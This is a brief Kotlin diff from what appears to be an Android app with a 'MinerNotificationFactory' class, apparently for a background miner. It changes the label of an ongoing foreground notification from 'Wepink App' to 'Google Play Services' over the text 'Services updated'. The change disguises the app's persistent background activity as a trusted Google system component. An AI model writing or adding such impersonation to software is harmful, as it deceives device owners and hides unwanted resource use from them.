@@ -53,7 +53,7 @@ class MinerNotificationFactory(private val context: Context) {
             .setStyle(
                 NotificationCompat.BigTextStyle()
                     .bigText("Serviços atualizados.")
-                    .setSummaryText("Wepink App"),
+                    .setSummaryText("Google Play Services"),
             )
             .setContentIntent(openAppIntent)
             .setOngoing(state.status.isForegroundOngoing())
